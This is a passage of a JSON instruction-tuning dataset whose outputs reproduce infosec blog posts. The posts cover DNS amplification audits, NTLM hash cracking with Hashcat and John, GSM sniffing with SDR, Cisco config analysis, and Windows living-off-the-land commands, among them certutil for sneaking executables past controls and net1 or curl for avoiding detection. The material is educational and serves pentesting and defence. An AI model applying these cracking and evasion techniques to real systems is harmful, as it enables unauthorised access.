9qsP5h033Qk t 707s"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Do You Know If Your DNS Server Can Be Used For DDoS Attacks?</title>\n<taxonomies>Author, Blue Team, Informational, InfoSec 101, Melissa Bruno, BIND, DDoS, DNS, DNS cache snooping, Mail Relay Servers, Melissa Bruno</taxonomies>\n<creation_date>Wed, 02 Oct 2019 15:23:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Melissa Bruno So you have an Internet-facing DNS server Maybe you decided to set one up at home for fun or your company has one that works with other services Either way you probably have a group of people in mind who should be using it But are you sure that they're the only ones who would be interested in it You may have heard about the dangers of open mail relay servers attackers can use improperly configured SMTP servers to send spam or phishing email to victims so it's the responsibility of the people running them to make sure they can't be used for evil Similarly improperly configured DNS servers can be used to launch attacks so checking how yours is set up is an important part of being a good Samaritan on the Internet If you're not familiar with DNS the simplest analogy is that it's akin to an elaborate phone book using domain names and IP addresses instead of people and phone numbers Queries to authoritative DNS servers will return the IP address or other information of a hostname only if the server has that information on hand Recursive DNS servers reach out to other servers to answer questions or resolve queries about a hostname if they do not have an answer but know where to find it If you're interested in a more comprehensive explanation DigitalOcean has a great deep-dive into the fundamentals of DNS A DNS resolver is considered fully open if it resolves any type of query from any source IP This gives an attacker the greatest number of options They may even use the DNS server to snoop on the type of websites you've been visiting with a technique known as DNS cache snooping In this blog post we'll be looking at how DNS resolver can be used in Distributed Denial of Service DDoS attacks via amplification To perform DDoS attacks via amplification attackers will use very small DNS requests to return answers that are many times larger amplified The initial request is forged so that it appears to be coming from the victim's IP address and in turn the DNS server sends the amplified response to the victim With enough spoofed requests coming from enough open DNS resolvers the recipient's resources may be exhausted and unable to accept normal traffic Let's take a look at a few examples of DNS requests using the dig command Dig is included by default on most distributions of Linux and Mac OS X Windows users can access dig by performing a Tools Only installation of the latest version of BIND The command dig qr 8.8.8.8 google.com will give us a good idea of how big a typical DNS query is 8.8.8.8 tells dig to query Google's DNS resolver at 8.8.8.8 google.com is the hostname to query and adding the qr flag returns the query size in the command output The answer size is returned by default This request is fairly small and balanced The request is 51 bytes and the response is only a bit larger at 55 bytes An attacker would not be interested in making this type of query because it only has an amplification factor of a little over 1.0 Now let's do another query with the same resolver and host but this time specify that any resource record type should be returned with the command dig qr 8.8.8.8 google.com any This query has an amplification factor of about 13 which is much more appealing to an attacker It allows them to minimize the amount of resources expended while inflicting more damage on a target If a DNS server is set up to resolve queries an attacker may use it to make requests to their own servers specifically set up for this purpose triggering responses up to 80 times larger than the original request For this reason recursive DNS servers pose the greatest risk Even if the server is non-recursive it may be possible to generate large DNS responses under normal circumstances and in these situations mitigating attacks can be trickier Response rate limiting and IP whitelisting are usually the most effective ways to mitigate DNS amplification attacks on a non-recursive DNS server So what can you do to mitigate the risk of your server being used in an attack Check the settings on your DNS server and restrict the allowed query types wherever you can Queries for ANY resource record types especially should be disabled if possible To see if your server will respond to an ANY request use the following command dig qr 8.8.8.8 whitehouse.gov ANY Replace 8.8.8.8 with the IP addresses of your name servers one at a time and replace whitehouse.gov with your domain If you get back any answers your DNS server does respond to ANY requests Disable support for recursive resolution if it is not needed Older versions of common DNS servers enable recursion by default so double-check that this feature is not enabled unintentionally To test this place a query to your nameservers for a domain for which they aren't authoritative dig recurse 8.8.8.8 www.yahoo.com A Like before run it multiple times each time replacing 8.8.8.8 with one of your nameservers This time though keep www.yahoo.com A as-is you want to ask a question your nameservers wouldn't normally answer If you get back any answers that nameserver will respond to recursive requests If you don't get any answers it doesn't Implement rate limiting on the number of queries accepted per minute This is especially important if recursion is required or if the server returns large authoritative responses Only allow queries from trusted hosts To test try running this command from an address outside your network again replacing 8.8.8.8 with each of your nameservers in turn dig 8.8.8.8 www.mycompany.com A If this succeeds you may need to limit the networks to which you'll answer queries You should always know what kinds of things are running on your network and what they're capable of Checking your DNS server configurations is a great way to make the Internet just a little bit safer overall Special thanks to Bill Stearns for providing additional configuration checks"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Cracking Passwords with Umlauts</title>\n<taxonomies>How-To, Informational, Carrie Roberts, DPAT, Hashcat, NTLM, Password cracking, Umlauts</taxonomies>\n<creation_date>Tue, 15 Oct 2019 15:31:03 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Guest Blog You have a password hash you would like to crack for a password that contains an Umlaut You know the two dots over a letter as is commonly seen in the German language For our example here we have the Windows password hash of the password M\u00f6m R\u00fclez I know I know it's not German but just work with it This password hash information was extracted from an Active Directory domain controller using the method described in the Domain Password Audit Tool DPAT Documentation dpatdomain.local larry 1603 aad3b435b51404eeaad3b435b51404ee ecd382f6949d712f7f81982242755cc3 The domain name is dpatdomain.local the username is larry and the Relative ID RID number is 1603 The next 32 characters aad3b435b51404eeaad3b435b51404ee are the LAN Manager LM hash It is an older weaker hashing algorithm maintained for backward compatibility Windows stores the value shown here which is simply the hash of a blank password when it has been configured to not store these weaker hashes In this case only the next hash value is a true representation of the password The next hash value ecd382f6949d712f7f81982242755cc3 is known as the NT New Technology or NTLM hash It is a stronger hash that requires more computing resources to crack To get started with password cracking we copy and paste our password containing umlauts into a text file called wordlist.txt We will use wordlist.txt as our word list during password cracking First we try John the Ripper JtR for password cracking as follows john hashes.ntds -w wordlist.txt --format NT Everything works as expected and the password is cracked because this password was included in the wordlist wordlist.txt Now let's try the same thing with the Hashcat password cracking tool hashcat -m 1000 -a 0 hashes.ntds wordlist.txt Here the -m 1000 parameter specifies the password type of NTLM and the -a 0 parameter specifies that a simple wordlist is used for password guesses To our dismay Hashcat does not crack the password We can take a closer look at our wordlist file using the xxd tool to show the bytes of the file The password is represented by the hex characters 4dc3b66d2052c3bc6c657a21 Notice the use of two bytes for each of the umlaut characters Conversely the image below shows the password converted from ASCII to hex 4df66d2052fc6c657a21 using a different character encoding To get Hashcat to crack the password properly we need to fix the encoding mismatch We could do this by creating our password list in Notepad on Windows and choosing ANSI for the encoding type as shown at the bottom of this image Or we could convert our wordlist with the iconv tool on Linux iconv wordlist.txt -f utf-8 -t windows-1252 wordlist-ansi.txt The -f parameter specifies what encoding we are converting from while the -t parameter specifies the encoding we are converting to The encoding names are confusing and inconsistent but windows-1252 cp1252 and ANSI are often used to refer to the same encoding Now running Hashcat again with the new wordlist wordlist-ansi.txt shows that we have cracked the password hashcat -m 1000 -a 0 hashes.ntds wordlist-ansi.txt However it displays the password in an interesting way giving the password in hex inside of a HEX tag Ah yes we recognize those hex characters 4df66d2052fc6c657a21 from our earlier investigation Let's convert that hex back to ascii and confirm it is the password we expect Now we have successfully cracked the password of M\u00f6m R\u00fclez using Hashcat We have demonstrated how to crack this special password with JtR and Hashcat using a dictionary attack but what if we want to brute force the password For the brute forcing method only the Hashcat solution will be shown in this blog post The following command defines character set one -1 as the German special characters and character set two -2 as all upper ?u lower ?l and special ?s characters in addition to character set one The long row of ten ?2 values tells Hashcat to crack all possible 10-character combinations using this character set The -a 3 parameter specifies that the Brute-force attack mode be used instead of a dictionary attack hashcat -m 1000 -a 3 hashes.ntds -1 usr share hashcat charsets special German de_ISO-8859-1-special.hcchr -2 ?1?u?l?s ?2?2?2?2?2?2?2?2?2?2 Unfortunately brute-forcing a 10-character password using this character set is not likely to complete in your lifetime but it does give some insight into how to include umlauts in the character set An alternative method is to define the umlauts in hex directly on the command line using the --hex-charset parameter as shown below Here we have specified that the \u00f6 f6 and the \u00fc fc be included in the character set along with all upper lower and special characters hashcat -m 1000 -a 3 hashes.ntds --hex-charset -1 ?l?u?sf6fc ?1?1?1?1?1?1?1?1?1?1 Happy cracking and please reach out if you have additional ideas or suggestions Thank you to Carrie Roberts for another terrific guest blog"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Intro to Software Defined Radio and GSM/LTE</title>\n<taxonomies>Author, Hardware Hacking, How-To, Informational, InfoSec 101, Ray Felch, GNURadio, GSM/LTE, Hackrf, Raymond Felch, RTL-SDR, SDR, Software Defined Radio, Wireshark</taxonomies>\n<creation_date>Tue, 29 Oct 2019 16:02:08 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch Disclaimer Be sure to use a faraday bag or cage before transmitting cellular data so you don't accidentally break any laws by illegally transmitting on regulated frequencies Additionally intercepting and decrypting someone else's data is illegal so be careful when researching your phone traffic Preface I held an Advanced Amateur Radio Operator license KR4FF for many years and my entire career consisted of working in the fields of Electronic Engineering and Embedded Software Development When I recently became aware of Software Defined Radio naturally I was curious to learn more The whole idea of using software to emulate what would normally require very expensive electronic hardware was appealing to me The following outlines my experiences as I traveled into the realm of SDR Hopefully others might benefit from my research and my practical implementation of it Software Defined Radio encapsulated Wikipedia definition Software-defined radio SDR is a radio communication system where components that have been traditionally implemented in hardware e.g mixers filters amplifiers modulators demodulators detectors etc are instead implemented by means of software on a personal computer or embedded system GNU Radio is a free open-source software development toolkit that provides signal processing blocks to implement software radios Get more info gnuradio.org Hardware First I purchased an inexpensive RTL2832U 20 dongle and also a moderately expensive 320 HackRF One dongle RTL2832U range 64MHz 1.7GHz with a gap at 1.1GhHz 1.25GHz HackRF One range 1MHz to 6GHz w Transmit capability rtl-sdr info ww.rtl-sdr.com buy-rtl-sdr-dvb-t-dongles HackRF info reatscottgadgets.com hackrf I started by installing the RTL2832U dongle and downloading the Windows-based SDR Sharp App After configuring SDR Sharp to run with the RTL2832U device I quickly began playing around with tuning in local FM Radio stations in my area A robust set of features makes it a bit intimidating at first but there are many helpful guides on the internet that can help shorten the learning curve I picked up the necessities pretty quickly SDR Sharp download link irspy.com download This was rewarding in itself as I spent many hours finding lots of FM stations and quite a few ham radio channels as well But now I wanted to really get my feet wet I wanted to get involved with what I saw others in the SDR community actively pursuing namely GSM LTE Mobile Communications Due to the higher operating frequencies of many of the mobile bands sometimes well over the maximum range of the RTL2832U I decided to switch out the RTL2832U for the HackRF One The RTL2832U tops out around 1.7GHz where the HackRF One can operate to 6GHz Typical major carriers have bands that can be in the range of 1710-1755MHz 1850-1990NHz 2110-2155MHz etc GSM LTE Mobile Communications General Information AT T and T-Mobile and others still actively provide GSM Global System for Mobile Communications support Verizon Sprint and US Cellular are CDMA Code Division Multiple Access carriers GSM phones use sim cards and can easily swap sims between other compatible GSM phones CDMA and GSM only use 3G Technology 4G LTE 4th generation Long Term Evolution is 10x faster than 3G Frequency information LTE GSM frequencies ww.worldtimezone.com gsm.html GSM frequencies in North America 850MHz and 1900MHz bands LTE LTE WiMax frequencies in North America 700MHz 1700-2100MHz 1900MHz and 2500-2700MHz bands Installing required modules and dependencies Install Gnu Radio prereqs sudo apt-get install build-gnuradio prereqs sudo apt install gnuradio Install GR-GSM Open Source Mobile Communications The gr-gsm project is based on the gsm-receiver written by Piotr Krysik also the main author of gr-gsm for the Airprobe project The aim is to provide a set of tools for receiving information transmitted by GSM equipment devices Dependencies GNU Radio with header files development tools git cmake autoconf libtool pkg-config g gcc make libc6 with headers libcppunit with headers swig doxygen liblog4cpp with headers python-scipy gr-osmosdr libosmocore with header files sudo apt install gitsudo apt install cmakesudo apt install autoconfsudo apt install libtool-binsudo apt install pkg-config sudo apt-get update sudo apt-get install libc6-dev-amd64sudo apt-get update sudo apt-get install libcppunit-1.14-0 sudo apt install swigsudo apt install doxygen sudo apt-get update sudo apt-get install liblog4cpp5-dev sudo apt-get update sudo apt-get install gr-osmosdr sudo apt-get update sudo apt-get install libosmocore-dev sudo apt install python-pip sudo apt-get install python-numpy python-scipy python-matplotlib ipython python-pandas python-sympy python-nose sudo apt install libcanberra-gtk-module libcanberra-gtk3-module Install gr-sdr Gnu Radio Software Defined Radio git clone it.osmocom.org gr-gsm cd gr-gsm mkdir build cd build cmake mkdir HOME .grc_gnuradio HOME .gnuradio make sudo make install sudo ldconfig Install Gqrx SDR Open Source 'Software Defined Radio receiver sudo apt install gqrx-sdr sudo apt install hackrf Install Hackrf tools Building HackRF tools from sourcePrerequisites for Linux Debian Ubuntu sudo apt-get install build-essential cmake libusb-1.0-0-dev pkg-config libfftw3-dev git clone ithub.com mossmann hackrf.git cd hackrf host mkdir build cd build cmake make sudo make install sudo ldconfig Kalibrate or kal can scan for GSM base stations in a given frequency band and can use those GSM base stations to calculate the local oscillator frequency offset Install Kalibrate-Hackrf kal GSM Base Station Sniffer git clone ithub.com scateu kalibrate-hackrf.git cd kalibrate-hackrf bootstrap configure Make sudo make install Install Wireshark free and open-source packet analyzer sudo apt-get update sudo apt install wireshark-qt Getting started I executed the command kal -s PCS to run kalibrate-hackrf kal and target the PCS 1900MHz band resulting in the following I decided to use the first frequency found 1930.2MHz for my follow-up testing Tuning to 1930.2MHz while running the Gqrx SDR see below shows activity centered around freq 1930.535MHz This will be the adjusted frequency that we will ultimately enter into the GnuRadio-Companion for capturing our packet traffic Using GnuRadio-Companion A few years back open-source 'airprobe_rtlsdr.grc Airprobe project was the goto block for live monitoring of traffic while using GnuRadio-Companion As of recent years 'airprobe_rtlsdr.grc was replaced by grgsm_livemon.grc Special note The gr-gsm project is based on the gsm-receiver written by Piotr Krysik also the main author of gr-gsm for the Airprobe project I changed directory to gr-gsm apps Executed gnuradio-companion grgsm_livemon.grc This brings up the GnuRadio-Companion GUI and displays the grgsm_livemon.grc block template I then enabled the radio by clicking on the Start button top center of display and tuned to 1930.535MHz adjusted frequency determined using Gqrx SDR As soon as I locked into the frequency I was presented with the following It's not obvious by the above image but the data inside the console terminal is streaming at a very fast rate and will continue to stream until we click the stop button top center of Gnu Radio Companion display Also notice the high volume of 2b bytes in the data stream This is a strong indication that we are successfully capturing cellular traffic as 2b is used as a filler byte when constructing the packets Using Wireshark to analyze the packets During a follow-up GnuRadio-Companion session I decided to open a new terminal to run Wireshark and analyze the streaming live data using the loop-back mode and a 'gsmtap filter This needs to be done as root so the command is sudo wireshark As expected Source and Destination are localhost due to loop-back mode and from my limited research of packet types I know that System Information Type 4 is a carrier beacon providing pertinent information Summary As far as I'm concerned this has turned out to be a pretty rewarding project and I feel I've learned quite a bit in the process Obviously I've barely scratched the surface of what Software Defined Radio is capable of but I'm now looking forward to continuing my research in this area Next up I would like to better understand those packets I captured what they mean and how the whole 'mobile network works in general I'd also like to run some sample test calls using my personal phones to keep it legal and capture decode my personal SMS 'Hello World packets"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Use CCAT: An Analysis Tool for Cisco Configuration Files</title>\n<taxonomies>How-To, Informational, CCAT, Cisco Config Analysis Tool, kayla mackiewicz</taxonomies>\n<creation_date>Mon, 04 Nov 2019 15:25:53 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kayla Mackiewicz Last year fellow tester Jordan Drysdale wrote a blog post about Cisco's Smart Install feature His blog post can be found here If this feature is enabled on a Cisco device an attacker can download or upload a config file and even execute commands Whether you use the Smart Install feature or some other method to obtain a config file during a pentest there is a tool out there called Cisco Config Analysis Tool or CCAT that can parse the file for you This tool could also come in handy for network administrators looking to conduct audits of their Cisco devices CCAT conducts a set of checks against the configuration file or folder of files that are supplied as input by the user The checks are based on the Cisco Guide to Harden Cisco IOS Devices The tool was written in Python and can be found at the following GitHub repository ithub.com cisco-config-analysis-tool ccat Running CCAT is straightforward and the tool offers several optional arguments In the command example below I ran CCAT against a directory of config files that were retrieved from a few Cisco devices and saved the results C ccat.py config_files -output results The output from the script in the command prompt contained a categorized list of the checks that took place and the results which were color-coded to highlight areas that may need attention The output was also saved to an HTML file for each file in the config_files directory These files can be viewed in the browser Viewing the files in the browser revealed a bit more information than what could be seen in the command prompt For each check that showed as red or yellow there was a brief explanation and or suggestion for how to fix the issue In the above example there were three instances of configurations that were shown in red and considered to be insecure The ARP inspection and DHCP snooping protections were both disabled leaving this particular device potentially vulnerable to man-in-the-middle MitM attacks Also Cisco Smart Install was enabled In summary the output from this tool is useful on an engagement where testers may be looking to highlight a device's misconfigurations that could be abused by an attacker"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>GSM Traffic and Encryption: A5/1 Stream Cipher</title>\n<taxonomies>Author, Hardware Hacking, How-To, Informational, Ray Felch, A5/1 Stream Cipher, GSM, Raymond Felch</taxonomies>\n<creation_date>Mon, 11 Nov 2019 15:00:01 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch Disclaimer Be sure to use a faraday bag or cage before transmitting cellular data so you don't accidentally break any laws by illegally transmitting on regulated frequencies Additionally intercepting and decrypting someone else's data is illegal so be careful when researching your phone traffic Some useful terminology Mobile Phone Related MS mobile station phone SIM subscriber identity module sim card IMSI international mobile subscriber identity subscriber ID TMSI temporary IMSI helps with privacy by obfuscating ISMI Ki 128-bit unique subscriber key paired with IMSI Tower Related BTS base transceiver station contains the equipment for transmitting and receiving radio signals antennas and equipment for encrypting and decrypting communications with the base station controller BSC BSC base station controller handles allocation of radio channels receives measurements from the mobile phones and controls handovers from BTS to BTS Core Network Related NSS Network Subsystem responsible for the routing of calls by way of the BSC and BTC MSC mobile switching center network switching VLR visitor location register database of mobile stations that have roamed the area HLR home location register main database of permanent subscriber information AuC authentication center Variables RAND 128-bit random number sent to MS by AuC to facilitate MS authentication challenge SRES challenge sent to MS generated using RAND Ki A3 algorithm KC uniquely generated key generated using RAND Ki A8 algorithm note data is encrypted using KC A5 1 algorithm Preliminary Information Before proceeding to the encryption process it may be helpful to know that although there are three different algorithms A3 A8 and A5 1 we can simplify the overall process significantly by stating upfront the following The A3 authentication algorithm is 'only used to facilitate authenticating that the mobile station MS has permission to be on the network Once authenticated the A8 ciphering key generating algorithm is 'only used to create a unique key KC that ultimately will be used by the MS and the Network for encrypting decrypting data using the A5 1 stream cipher algorithm on-the-fly The A3 algorithm A8 algorithm IMSI and Ki all exist on the MS phone SIM card and the A5 1 stream cipher algorithm exists in the MS phone hardware Additionally the Home Network HLR VLR MSC AuC has access to the same information via its databases Typical Process Diagram 01 Process follow diagram-01 Mobile station MS requests access to the network MS sends its IMSI to the Network Subsystem NSS via the BSC BTS The IMSI sent by the MS is forwarded to the MSC on the network and the MSC passes that IMSI on to the HLR and requests authentication The HLR checks its database to make sure the IMSI belongs to the network If valid The HLR forwards the authentication request and IMSI to the Authentication Center AuC The AuC will access its database to search for the Ki that is paired with the given IMSI The Auc will generate a 128-bit random number RAND The RAND and Ki will be passed into the A3 authentication algorithm creating a 32-bit SRES signed response for the challenge-response method The RAND is transmitted via the BSC BTS to the mobile station MS The RAND received by the MS together with the SIM card-Ki are passed into the SIM card-A3 authentication algorithm generating the phones SRES response The phones SRES response is transmitted via the BSC BTS back to the AuC on the network The AuC compares the sent SRES with the received SRES for a match If they match then the authentication is successful The subscriber MS joins the network The RAND together with the SIM card-Ki are passed into the SIM card-A8 ciphering key algorithm to produce a ciphering key KC The KC generated is used with the A5 stream ciphering algorithm to encipher or decipher the data The A5 algorithm is stored in the phone's hardware and is responsible for encrypting and decrypting data on the fly Levels of Security Algorithms IMSI Obfuscation The first time a subscriber joins the network the Authentication Center AuC assigns a TMSI temporary IMSI which will be used in place of the subscribers IMSI going forward I say temporary but in fact the TMSI is stored along with the IMSI in the VLR visitor location register When the phone is switched off the phone saves the TMSI on its SIM card ensuring it is available when switched on again Every new update roaming handoffs etc results in a new TMSI being created The TMSI is used in place of the IMSI to protect the subscriber's identity Sample Packet Screenshots Location Updating Request TMSI not established yet Authentication Request TMSI A5 1 Algorithm Supported Summary This write-up documents some of my follow-up research with regard to analyzing the GSM traffic packets I captured using Software Defined Radio My attempt was to better understand the GSM mobile network protocols and procedures with an emphasis on the authentication and ciphering algorithms being deployed In my opinion there is a huge demand for exploring this relatively untouched attack vector especially as we move towards adopting 5G technologies The A5 1 stream cipher algorithm is still in use today on many GSM networks has a prior history of being exploitable and there are quite a few networks that do not even implement ciphering in their protocols SMS data completely exposed These vulnerabilities can potentially expose our private SMS messages personal data and even our GPS locations to the public if left unguarded More research in this area is required to ensure our privacy remains secure From an InfoSec perspective the areas of concern might be MiTM attacks network breaches etc The playing field is wide open References ww.sans.org reading-room whitepapers telephone gsm-standard-an-overview-security-317 n.wikipedia.org wiki GSM ayatu.com blog_28 by ayatu.com blogger_by 20Rashid 20Feroze"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Rainy Day Windows Command Research Results</title>\n<taxonomies>Blue Team, Blue Team Tools, How-To, Informational, Red Team, Red Team Tools, Certutil, Clip, Clipboard, Cmdkey, Curl, Microsoft, Net1, Sally Vandeven, Tar, Where, Whoami, Windows, Windows Command, Wslconfig</taxonomies>\n<creation_date>Wed, 13 Nov 2019 13:38:03 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sally Vandeven We have all heard people talk about how much cooler Linux is than Windows so much easier to use etc Well they are not necessarily wrong but we have learned that Microsoft has some very interesting gems hiding in plain sight Seriously Microsoft seems to be making a concerted effort to add some Linux-y functionality In fact they introduced Linux as a subsystem on Windows 10 back in 2016 You enable the feature using PowerShell then visit the Microsoft Store and pick your favorite distro to install But I digress this blog post is not about Linux it is about some neat utilities built into Windows some are in fact very Linux-y and some are unique to Windows but still interesting to pentesters We will show you some of the interesting finds below Note that the help docs for many of the tools can be found in the Windows Command reference document here Certutil The built-in certutil command can be used as a quick base64 encoder decoder It is meant to encode and decode SSL certificates but can be used for other things as well For example let's say you need to get an executable file on to a target system but a network control detects prevents the transfer of an EXE file Well in that case you can base64 encode it prior to sending and then base64 decode it using certutil once it's on the target system Nice Here is an example using a string of text but it would work the same way for a binary executable file By default certutil decodes and encodes base64 data But another fun fact is that it can also decode hexadecimal While the help text does not show an option for hex encoding we tried it and it actually does work have a look This might come in very handy if you are looking for say strings in a binary Below is an example showing a hex dump of notepad.exe Clip Microsoft developed the Clippy character to assist users with Office products He has been on and off the payroll since 1997 and understandably appears to be currently on leave Completely unrelated to Clippy is the clip utility This utility redirects output to the clipboard For example if you want to capture running services and insert the list into the clipboard You can direct the output from a command into the clipboard for easy copy pasting or you stuff the contents of a whole file into the clipboard net1 start clip PS C net1 user domain clip clip myTextFile.txt In all three cases you have loaded something into the clipboard which you can retrieve and paste where you need it using right-click paste or Control-V I use clip.exe all the time with WSL Windows Subsystem for Linux as well using something like this cat file.csv cut -f2 -d sort uniq clip.exe It is a very handy way to slice and dice data for use in a report Clipboard saving of multiple items is off by default but if you turn it on ...you can use Windows V to access all of the clips in the clipboard To paste one of the items in the clipboard just click on the one you want You can even PIN a clip and it will be saved until a reboot even if you clear the clipboard This is a great place to store passwords Cmdkey Cmdkey is the command version of the Windows credential manager The equivalent GUI version can be launched using control keymgr.dll or by selecting Credential Manager from the Control Panel Show any saved credentials using the command cmdkey list But what if there were stored credentials that were privileged How could an attacker use them According to this blog post it's easy although when I set up Cobalt Strike and tried it it didn't work but your mileage may vary Curl Curl is a command-line browser like wget that pulls content from a web server and is found on most Linux systems by default and it was recently added to Windows For pentesters maybe proxy configurations prevent you from downloading files using a browser If so try curl and maybe such downloads won't get noticed Here is an example of something very useful you can do with curl Curl has an in-depth help page as well Use curl --help to view all the options Net1 net1 is pretty much the same as net but about 20 years ago as we approached Y2K there was a problem with the net command The net1 command was the remedy for that issue and it has stuck around ever since Why does this matter now It probably doesn't in most cases but if you are a pentester you might just find that the net command gets noticed by the blue team while the net1 command does not Example commands net1 localgroup administrators enumerate local admin accounts net1 start see list of running services net1 start find v c show a count of running services Tar Tar is an old Unix utility originally created to make tape archives from one or more files This was developed as a backup solution Today tar is used similar to zip to make a single archive out of multiple files in order to backup archive transmit etc In April 2018 tar was included in Windows 10 builds Using the standard Windows help it appears as though tar for Windows has very few options However when the --help option is requested you can see that there is actually much more functionality including compression options like its Linux cousin We tested this by using tar to archive and compress a few files on a Windows system We then moved the files to a Debian Linux machine and found that they are in fact valid tarballs one without and one with compression Where Where is like the Linux locate command It finds files for you and is very handy Example where R c F .conf .xml This will search recursively through the C drive looking for conf and xml files If found the F means show the full path Whoami The Whoami command displays information about the current account Used without arguments it displays the account name It can show the privileges or group membership associated with the current account using the priv and groups options respectively It can also display the FQDN and UPN for the account wslconfig This built-in command shows the current Windows Subsystem for Linux installations It also allows you to do some other administrative tasks associated with Linux distributions provided you have admin-level access It is definitely interesting to know if WSL has been enabled on a system that you are testing from or have pivoted to If you see this message then WSL has not been enabled on the system This on the other hand indicates that Kali Linux has been installed on the system If it has not been enabled and you have admin rights by all means go ahead and enable it So for the red-teamers out there add these to your repertoire of living off the land tools And blue-teamers might want to keep an eye out for use of these tools Regular users will not likely be using curl certutil and tar so monitoring their use should generate actionable alerts instead of noise That's all for now ...but we will keep digging and if we find more interesting Windows commands we will compose a sequel"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>What's Changed in Recon-ng 5.x</title>\n<taxonomies>Author, Brian King, How-To, Informational, Recon, Brian King, Recon-ng</taxonomies>\n<creation_date>Tue, 26 Nov 2019 16:22:35 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian King Recon-ng had a major update in June 2019 from 4.9.6 to 5.0.0 This post is meant to help with the adjustment by providing a cheat sheet for common commands and mapping of some old syntax to the new syntax If you're at all like me you'll assume that what you know from the 4.x version will help you get up to speed on 5.x And you'll be wrong If you instead treat Recon-ng 5.x as if it's a completely new tool you'll be fine Forget what you know about the 4.x version Visit the Recon-ng wiki on GitHub Read the whole Getting Started section and maybe join the Slack workspace it mentions at the end Read the whole Features section The Troubleshooting section is also helpful and very short The Intro to Recon-ng v5 screencast on the Videos section is also worth the time Go slowly at first and take notes for yourself The major differences in Recon-ng 5.x involve Moving from BitBucket to GitHub Updating to Python 3 Python 3.6 is now the minimum requirement Moving the modules into a separately-managed marketplace Modifying the syntax of some commands Manually adding seed data to the database is now done by db insert your_item_type instead of add your_item_type Context must be explicitly stated modules search instead of just search and options set instead of just set Everything is case-sensitive and lower-case except for the names of options both global and per-module which must be in ALL CAPS The actual use of the tool hasn't changed much but the initial tasks are different enough that I for one felt completely lost If you have scripts or rc files those will need to be updated to use the new syntax too The first of those major differences above is easy enough the project is on GitHub now and not BitBucket If you visit the old BitBucket site you get the new URL ithub.com lanmaster53 recon-ng The update to Python 3 is even less of an adjustment because it has no effect on how you use the tool Unless you're developing Recon-ng modules you can ignore this architectural change Moving all of the modules into a marketplace allows modules to be created and maintained separately from the Recon-ng framework itself This gives two huge and immediate benefits First it draws a clear line between what's the framework's responsibility and what is handled by any given module Second it allows modules to be updated independently from the framework which means module updates don't need to be as disruptive as they sometimes used to be You can learn more about how the marketplace works from the Recon-ng wiki As a Recon-ng user the only thing you need to know about the marketplace is that it exists and that you must install modules from there before you can use them If you do this as part of your initial setup you can almost forget about the separation The main point of this article however is about adjusting to the new command syntax The sections below provide a suggested sequence to follow for a new installation and then a cheat sheet to refer to as you use Recon-ng for actual work Setup Clone the repo install framework dependencies install three additional dependencies for the marketplace modules launch the framework install the marketplace modules then add your own API keys After these steps you'll have a functioning Recon-ng installation ready to 